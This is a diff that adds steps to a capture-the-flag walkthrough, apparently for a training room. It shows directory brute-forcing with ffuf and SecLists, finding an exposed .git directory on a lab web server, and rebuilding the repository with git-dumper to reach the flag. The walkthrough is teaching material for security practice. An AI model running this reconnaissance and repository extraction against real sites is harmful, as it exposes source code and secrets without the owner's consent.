@@ -76,6 +76,172 @@ http://MACHINE_IP:8080
   > - Git repositories
   > - configuration files
 
+## STEP 04
+
+- Here, we need to use directory brute-forcing against the web application server.
+- Before this, we need a wordlist to perform this.
+- Check the wordlist
+  ```bash
+  ls /usr/share/wordlists/
+  ```
+- Output
+  ```
+  MetasploitRoom
+  SecLists
+  dirbuster
+  rockyou.txt
+  PythonForPentesters
+  dirb
+  fasttrack.txt
+  wordlists
+  ```
+  - If you get an error response, it means that the directory from the wordlist does not exist on the attacker machine(you)
+  - Use these two commands to install the wordlist called **seclist**
+    ```
+    sudo apt update
+    sudo apt install seclists
+    ```
+    > This will update and download the **seclist** folder into the **wordlist**
+- Now locate the *Web contetn worldlist* from seclist.
+  ```bash
+  ls /usr/share/wordlists/SecLists/Discovery/Web-Content/
+  ```
+  - Output
+  ```
+  common.txt
+  directory-list-2.3-small.txt
+  directory-list-2.3-medium.txt
+  raft-small-files.txt
+  raft-small-directories.txt
+  ```
+- Perform DPerform Directory Discovery
+- We use *ffuf*
+  > **ffuf ( Fuzz Faster U Fool)** is a tool that sends many requests to a web server using a wordlist and checks the responses to find hidden directories, files, parameters, or endpoints.
+
+  ```bash
+  ffuf -u http://MACHINE_IP:8080/FUZZ \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
+  -fc 404
+  ```
+  > ffuf: A web fuzzing tool used to discover hidden directories, files, and endpoints.
+
+  > - **-u http://MACHINE_IP:8080/FUZZ** : Defines the target URL. The FUZZ keyword is replaced with each entry from the wordlist to test different paths on the server.
+    ```
+    /FUZZ
+    ``` 
+    becomes:
+    ```
+    /admin
+    /backup
+    /.git
+    /source
+    ```
+  > - **-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt** : Specifies the wordlist that contains common directory and file names. ffuf uses each word from this list to create requests.
+  > - **-fc 404** : Filters out HTTP 404 Not Found responses, so ffuf does not display paths that do not exist.
+  
+  > Overall, this command checks the web server for hidden directories or files using a wordlist and shows only valid or interesting responses.
+
+-  Discover the Exposed Git Repository
+-  The scan returns
+    ```
+    .git/HEAD [Status: 200]
+    ```
+    > This is the important discovery.
+    ```
+    A `.git` directory contains:
+      
+      - Source code history
+      - Commit information
+      - Previous versions
+      - Developer information
+      - Deleted files
+      
+      The developer accidentally exposed the Git repository.
+      ```
+- Confirm .git Exposure
+  ```bash
+  curl http://MACHINE_IP:8080/.git/HEAD
+  ```
+  Output:
+  ```
+  ref: refs/heads/main
+  ```
+  > This confirms the repository exists.
+- Find Git Commit History
+  Check the Git log:
+  ```bash
+  curl http://10.130.176.140:8080/.git/logs/HEAD
+  ```
+  Output:
+  ```
+  0000000000000000000000000000000000000000 
+  0f13550b4cb13e9f30c61d5b342c532d21e45bda 
+  night-shift <dev@byte-lotus.internal>
+  commit (initial): initial Byte Lotus guest platform
+  ```
+  > Important information:
+      Commit hash:
+      ```
+      0f13550b4cb13e9f30c61d5b342c532d21e45bda
+      ```
+## Recovering an Exposed Git Repository Using git-dumper
+
+The easiest way to recover an exposed Git repository is by using **git-dumper**.
+
+`git-dumper` is a tool used to download an exposed `.git` directory from a web server and reconstruct the Git repository locally.
+
+When a website accidentally exposes its `.git` directory, it may reveal:
+
+- Source code
+- Commit history
+- Developer information
+- Previous versions of files
+- Configuration files
+- Sometimes sensitive data that was removed from the current version but still exists in Git history
+
+The general process is:
+
+1. Identify that the `.git` directory is exposed.
+2. Use `git-dumper` to retrieve the repository contents.
+3. Analyze the recovered Git files and history.
+
+The purpose of using `git-dumper` is to restore the repository structure so that the exposed Git data can be examined.
+
+## FINALE STEP
+
+Install:
+```bash
+pip install git-dumper
+```
+
+Check installation:
+```bash
+git-dumper --help
+```
+
+Dump the Git Repository
+Run:
+```bash
+git-dumper http://10.130.176.140:8080/.git/ byte_lotus
+```
+Output:
+```
+[-] Fetching .git recursively
+[-] Fetching .git/objects/
+[-] Fetching .git/logs/
+[-] Fetching .git/refs/
+[-] Running git checkout .
+Updated 3 paths from the index
+```
+> This means the repository has been recovered.
+
+Move into the dumped folder:
+```bash
+cd byte_lotus
+```
+### Inside this folder you will find the **Flag** 🚩.
+
+# Congratulations on Exploration
 
 
   
